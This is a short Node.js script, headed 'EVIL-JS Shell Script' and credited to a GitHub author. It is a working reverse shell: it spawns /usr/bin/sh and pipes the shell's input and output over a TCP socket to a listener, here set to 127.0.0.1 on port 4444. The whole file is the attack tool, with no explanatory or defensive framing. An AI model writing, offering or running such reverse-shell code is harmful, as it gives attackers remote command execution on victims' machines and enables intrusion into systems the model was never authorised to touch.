// AUTHOR: MatrixTM26
// GITHUB: https://github.com/MatrixTM26
// EVIL-JS Shell Script

const SERVER = "127.0.0.1";
const PORT = 4444;

var Net = require("net");
var Process = require("child_process");
var Sh = Process.spawn("/usr/bin/sh", []);
var Socket = new Net.Socket();

function Shell() {
    try {
        Socket.connect(PORT, SERVER, function () {
            Socket.pipe(Sh.stdin);
            Sh.stdout.pipe(Socket);
            Sh.stderr.pipe(Socket);
            console.log(`CONNECTED TO: ${SERVER}:${PORT}`);
        });
    } catch (Error) {
        console.log(`UNEXPECTED ERROR!: ${Error}`);
    }
}

Shell();
